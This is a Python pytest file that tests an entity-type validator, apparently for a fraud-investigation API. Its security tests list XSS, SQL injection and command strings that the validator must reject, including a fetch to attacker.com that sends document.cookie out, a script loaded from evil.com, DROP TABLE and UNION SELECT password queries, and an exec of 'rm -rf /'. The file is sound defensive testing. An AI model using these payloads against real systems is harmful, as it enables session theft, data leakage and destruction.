"""
Comprehensive test suite for entity type validation
Tests all validation scenarios, security checks, and error handling.
"""

import pytest
from pydantic import ValidationError

from app.models.validation import ValidatedEntityType, ValidatedInvestigationRequest
from app.router.models.structured_investigation_models import (
    StructuredInvestigationRequest,
)
from app.utils.entity_validation import (
    create_entity_type_error_response,
    get_all_entity_types,
    get_entity_type_categories,
    get_entity_type_suggestions,
    validate_entity_type_against_enum,
    validate_entity_type_format,
)


class TestEntityTypeValidationUtils:
    """Test entity type validation utility functions"""

    def test_get_all_entity_types(self):
        """Test getting all valid entity types"""
        types = get_all_entity_types()
        assert isinstance(types, list)
        assert len(types) > 0
        assert "user" in types
        assert "device" in types
        assert "transaction" in types

    def test_get_entity_type_categories(self):
        """Test getting entity types organized by categories"""
        categories = get_entity_type_categories()
        assert isinstance(categories, dict)
        assert "core" in categories
        assert "behavioral" in categories
        assert "risk" in categories

        # Check core types
        core_types = categories["core"]
        assert "user" in core_types
        assert "device" in core_types

        # Check behavioral types
        behavioral_types = categories["behavioral"]
        assert "login_pattern" in behavioral_types

    def test_validate_entity_type_format_valid(self):
        """Test format validation with valid inputs"""
        valid_inputs = ["user", "device", "transaction", "EMAIL"]

        for input_type in valid_inputs:
            is_valid, error = validate_entity_type_format(input_type)
            assert is_valid is True
            assert error is None

    def test_validate_entity_type_format_invalid(self):
        """Test format validation with invalid inputs"""
        invalid_inputs = [
            ("", "Entity type cannot be empty"),
            ("  ", "Entity type cannot be empty"),
            (123, "Entity type must be a string"),
            ("a" * 101, "Entity type exceeds maximum length of 100 characters"),
            ("<script>alert(1)</script>", "Invalid characters detected in entity type"),
            ("user; DROP TABLE users;", "Invalid characters detected in entity type"),
            ("javascript:alert(1)", "Invalid characters detected in entity type"),
        ]

        for input_type, expected_error in invalid_inputs:
            is_valid, error = validate_entity_type_format(input_type)
            assert is_valid is False
            assert expected_error in error

    def test_validate_entity_type_against_enum_valid(self):
        """Test enum validation with valid entity types"""
        valid_types = ["user", "device", "transaction", "account", "network"]

        for entity_type in valid_types:
            is_valid, error = validate_entity_type_against_enum(entity_type)
            assert is_valid is True
            assert error is None

    def test_validate_entity_type_against_enum_invalid(self):
        """Test enum validation with invalid entity types"""
        invalid_types = ["invalid_type", "fake_entity", "nonexistent"]

        for entity_type in invalid_types:
            is_valid, error = validate_entity_type_against_enum(entity_type)
            assert is_valid is False
            assert "Invalid entity type" in error
            assert "Did you mean one of" in error or "Total valid types:" in error

    def test_get_entity_type_suggestions(self):
        """Test entity type suggestions"""
        # Test partial match
        suggestions = get_entity_type_suggestions("use")
        assert isinstance(suggestions, list)
        assert "user" in suggestions

        # Test category match
        suggestions = get_entity_type_suggestions("pattern")
        assert isinstance(suggestions, list)
        assert any("pattern" in s for s in suggestions)

        # Test no match fallback
        suggestions = get_entity_type_suggestions("xyz123")
        assert isinstance(suggestions, list)
        assert len(suggestions) > 0  # Should fallback to core types

    def test_create_entity_type_error_response(self):
        """Test error response creation"""
        error_response = create_entity_type_error_response("invalid_type")

        assert isinstance(error_response, dict)
        assert error_response["error"] == "Invalid entity type"
        assert error_response["provided_type"] == "invalid_type"
        assert "suggestions" in error_response
        assert "categories_available" in error_response
        assert "total_supported_types" in error_response
        assert isinstance(error_response["total_supported_types"], int)
        assert error_response["total_supported_types"] > 0


class TestValidatedEntityType:
    """Test ValidatedEntityType model validation"""

    def test_valid_entity_types(self):
        """Test with valid entity types"""
        valid_types = [
            "user",
            "device",
            "transaction",
            "account",
            "network",
            "location",
        ]

        for entity_type in valid_types:
            validated = ValidatedEntityType(entity_type=entity_type)
            assert validated.entity_type == entity_type.lower()

    def test_case_insensitive_validation(self):
        """Test case insensitive entity type validation"""
        test_cases = [
            ("USER", "user"),
            ("Device", "device"),
            ("TRANSACTION", "transaction"),
            ("Account", "account"),
        ]

        for input_type, expected in test_cases:
            validated = ValidatedEntityType(entity_type=input_type)
            assert validated.entity_type == expected

    def test_whitespace_handling(self):
        """Test whitespace trimming"""
        test_cases = [
            ("  user  ", "user"),
            ("\tdevice\t", "device"),
            ("\nTransaction\n", "transaction"),
        ]

        for input_type, expected in test_cases:
            validated = ValidatedEntityType(entity_type=input_type)
            assert validated.entity_type == expected

    def test_invalid_entity_types(self):
        """Test with invalid entity types"""
        invalid_types = ["invalid_type", "fake_entity", "nonexistent_type", "user_fake"]

        for entity_type in invalid_types:
            with pytest.raises(ValidationError) as exc_info:
                ValidatedEntityType(entity_type=entity_type)

            error = str(exc_info.value)
            assert "Invalid entity type" in error

    def test_security_validation(self):
        """Test security validation against injection attacks"""
        malicious_inputs = [
            "<script>alert(1)</script>",
            "javascript:alert(1)",
            "user; DROP TABLE users;",
            "device' UNION SELECT * FROM sensitive_data--",
            "<iframe src='evil.com'></iframe>",
            "vbscript:msgbox(1)",
            "user--comment",
            "device;malicious_command",
        ]

        for malicious_input in malicious_inputs:
            with pytest.raises(ValidationError) as exc_info:
                ValidatedEntityType(entity_type=malicious_input)

            error = str(exc_info.value)
            assert "Invalid characters detected" in error

    def test_empty_and_none_values(self):
        """Test empty and None values"""
        with pytest.raises(ValidationError):
            ValidatedEntityType(entity_type="")

        with pytest.raises(ValidationError):
            ValidatedEntityType(entity_type="   ")

        with pytest.raises(ValidationError):
            ValidatedEntityType()

    def test_length_validation(self):
        """Test length validation"""
        # Test maximum length
        long_string = "a" * 101
        with pytest.raises(ValidationError) as exc_info:
            ValidatedEntityType(entity_type=long_string)

        error = str(exc_info.value)
        assert (
            "should have at most 100 characters" in error
            or "exceeds maximum length" in error
        )


class TestValidatedInvestigationRequest:
    """Test ValidatedInvestigationRequest model validation"""

    def test_valid_investigation_request(self):
        """Test valid investigation request"""
        request = ValidatedInvestigationRequest(
            entity_id="test123",
            entity_type="user",
            investigation_id="inv123",
            time_range="30d",
        )

        assert request.entity_id == "test123"
        assert request.entity_type == "user"
        assert request.investigation_id == "inv123"
        assert request.time_range == "30d"
        assert request.mode == "manual"  # default

    def test_investigation_request_with_mode(self):
        """Test investigation request with specific mode"""
        request = ValidatedInvestigationRequest(
            entity_id="test456",
            entity_type="device",
            investigation_id="inv456",
            time_range="7d",
            mode="structured",
        )

        assert request.mode == "structured"

    def test_invalid_entity_type_in_request(self):
        """Test invalid entity type in investigation request"""
        with pytest.raises(ValidationError) as exc_info:
            ValidatedInvestigationRequest(
                entity_id="test123",
                entity_type="invalid_type",
                investigation_id="inv123",
                time_range="30d",
            )

        error = str(exc_info.value)
        assert "Invalid entity type" in error


class TestStructuredInvestigationRequest:
    """Test StructuredInvestigationRequest model validation"""

    def test_valid_structured_request(self):
        """Test valid structured investigation request"""
        request = StructuredInvestigationRequest(
            entity_id="test789", entity_type="transaction"
        )

        assert request.entity_id == "test789"
        assert request.entity_type == "transaction"
        assert request.enable_verbose_logging is True  # default
        assert request.enable_journey_tracking is True  # default
        assert request.investigation_priority == "normal"  # default

    def test_structured_request_with_options(self):
        """Test structured request with custom options"""
        request = StructuredInvestigationRequest(
            entity_id="test999",
            entity_type="account",
            investigation_id="custom_inv",
            enable_verbose_logging=False,
            investigation_priority="high",
            metadata={"custom": "data"},
        )

        assert request.investigation_id == "custom_inv"
        assert request.enable_verbose_logging is False
        assert request.investigation_priority == "high"
        assert request.metadata == {"custom": "data"}

    def test_invalid_entity_type_structured(self):
        """Test invalid entity type in structured request"""
        with pytest.raises(ValidationError) as exc_info:
            StructuredInvestigationRequest(
                entity_id="test123", entity_type="invalid_entity"
            )

        error = str(exc_info.value)
        assert "Invalid entity type" in error


class TestSecurityValidation:
    """Comprehensive security validation tests"""

    @pytest.mark.parametrize(
        "malicious_input,expected_error",
        [
            ("<script>alert('xss')</script>", "Invalid characters detected"),
            ("javascript:alert(document.cookie)", "Invalid characters detected"),
            ("user'; DROP TABLE investigations; --", "Invalid characters detected"),
            (
                'device" UNION SELECT password FROM users --',
                "Invalid characters detected",
            ),
            (
                "<iframe src=\"javascript:alert('xss')\"></iframe>",
                "Invalid characters detected",
            ),
            ('vbscript:CreateObject("WScript.Shell")', "Invalid characters detected"),
            ("data:text/html,<script>alert(1)</script>", "Invalid characters detected"),
            ("user/**/UNION/**/SELECT", "Invalid characters detected"),
            ("device;exec('rm -rf /')", "Invalid characters detected"),
            ("account--admin_backdoor", "Invalid characters detected"),
        ],
    )
    def test_comprehensive_security_validation(self, malicious_input, expected_error):
        """Test comprehensive security validation against various attack vectors"""
        with pytest.raises(ValidationError) as exc_info:
            ValidatedEntityType(entity_type=malicious_input)

        error = str(exc_info.value)
        assert expected_error in error

    def test_sql_injection_patterns(self):
        """Test SQL injection pattern detection"""
        sql_injection_patterns = [
            "user' OR '1'='1",
            "device; DROP TABLE users;",
            "account UNION SELECT * FROM sensitive_data",
            "transaction' INSERT INTO logs VALUES('hacked')",
            "location' UPDATE admin SET password='pwned'",
            "network' DELETE FROM investigations WHERE id > 0",
        ]

        for pattern in sql_injection_patterns:
            with pytest.raises(ValidationError) as exc_info:
                ValidatedEntityType(entity_type=pattern)

            error = str(exc_info.value)
            assert "Invalid characters detected" in error

    def test_script_injection_patterns(self):
        """Test script injection pattern detection"""
        script_patterns = [
            "<script src='http://evil.com/malware.js'></script>",
            "javascript:fetch('http://attacker.com/steal?data='+document.cookie)",
            "<img src='x' onerror='alert(1)'>",
            "<div onmouseover='alert(\"XSS\")'>hover me</div>",
            'vbscript:msgbox("Infected")',
            "<iframe src='data:text/html,<script>location.href=\"http://evil.com\"</script>'>",
        ]

        for pattern in script_patterns:
            with pytest.raises(ValidationError) as exc_info:
                ValidatedEntityType(entity_type=pattern)

            error = str(exc_info.value)
            assert "Invalid characters detected" in error


class TestPerformanceAndEdgeCases:
    """Test performance and edge cases"""

    def test_all_valid_entity_types(self):
        """Test all valid entity types from the enum"""
        all_types = get_all_entity_types()

        # Test each valid type
        for entity_type in all_types[:10]:  # Test first 10 to avoid excessive test time
            validated = ValidatedEntityType(entity_type=entity_type)
            assert validated.entity_type == entity_type.lower()

    def test_unicode_and_special_characters(self):
        """Test Unicode and special characters (should be rejected)"""
        unicode_inputs = [
            "usér",  # accented character
            "デバイス",  # Japanese characters
            "пользователь",  # Cyrillic
            "user🔒",  # emoji
            "device\x00null",  # null byte
            "account\r\ninjection",  # CRLF injection
        ]

        for unicode_input in unicode_inputs:
            with pytest.raises(ValidationError):
                ValidatedEntityType(entity_type=unicode_input)

    def test_boundary_conditions(self):
        """Test boundary conditions"""
        # Test exactly at limit
        max_length_string = "a" * 100
        with pytest.raises(
            ValidationError
        ):  # Should fail because it's not a valid enum value
            ValidatedEntityType(entity_type=max_length_string)

        # Test just over limit
        over_limit_string = "a" * 101
        with pytest.raises(ValidationError) as exc_info:
            ValidatedEntityType(entity_type=over_limit_string)

        error = str(exc_info.value)
        assert (
            "should have at most 100 characters" in error
            or "exceeds maximum length" in error
        )

    def test_normalization_consistency(self):
        """Test that normalization is consistent"""
        variations = ["USER", "User", "user", "  USER  ", "\tuser\t", "\nUSER\n"]

        results = []
        for variation in variations:
            validated = ValidatedEntityType(entity_type=variation)
            results.append(validated.entity_type)

        # All should normalize to the same value
        assert all(result == "user" for result in results)


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
